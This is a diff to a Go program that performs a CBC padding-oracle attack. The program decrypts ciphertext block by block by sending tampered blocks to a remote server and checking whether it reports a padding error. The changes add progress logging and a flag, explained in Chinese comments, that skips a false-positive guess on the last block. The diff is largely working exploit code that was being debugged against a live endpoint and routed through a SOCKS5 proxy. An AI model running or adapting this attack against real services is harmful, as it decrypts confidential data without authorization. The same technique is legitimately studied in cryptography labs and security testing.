@@ -51,16 +51,24 @@ func setupHttpClient(socks5Address string) error {
 	return nil
 }
 
-func decryptUsingCBCPaddingOracle(twoCipherBlocks []byte, onePlainBlock []byte) error {
+func decryptUsingCBCPaddingOracle(twoCipherBlocks []byte, onePlainBlock []byte, lastBlock bool) error {
 	tempBlocks := make([]byte, len(twoCipherBlocks))
 	copy(tempBlocks, twoCipherBlocks)
 	for i := 15; i >= 0; i-- {
+		log.Printf("  byte in block %d\n", i)
 		pad := byte(16 - i)
 		for k := 15; k > i; k-- {
 			tempBlocks[k] = twoCipherBlocks[k] ^ onePlainBlock[k] ^ pad
 		}
 		j := 0
 		for ; j < 256; j++ {
+			log.Printf("    test for byte %d\n", j)
+			//因为last block在i==15和j==1时，就是没有修改的block，自然padding是对的，
+			//但是因为我只传了最后2个block给服务器，所以验证是错误的，所以也会返回404错误，
+			//这就误判了，所以要跳过这个步骤
+			if lastBlock && i == 15 && j == 1 {
+				continue
+			}
 			tempBlocks[i] = twoCipherBlocks[i] ^ byte(j) ^ pad
 			if isPaddingValid(hex.EncodeToString(tempBlocks)) {
 				onePlainBlock[i] = byte(j)
@@ -90,7 +98,8 @@ func decryptCipherText(cipherText []byte) ([]byte, error) {
 	blocks := srcLen / 16
 	dstBytes := make([]byte, (blocks-1)*16)
 	for i := 1; i < blocks; i++ {
-		if err = decryptUsingCBCPaddingOracle(cipherBytes[(i-1)*16:(i+1)*16], dstBytes[(i-1)*16:i*16]); err != nil {
+		log.Printf("block %d\n", i)
+		if err = decryptUsingCBCPaddingOracle(cipherBytes[(i-1)*16:(i+1)*16], dstBytes[(i-1)*16:i*16], i == blocks-1); err != nil {
 			return nil, fmt.Errorf("Decrypt block at position %d failed:%v", i, err)
 		}
 	}
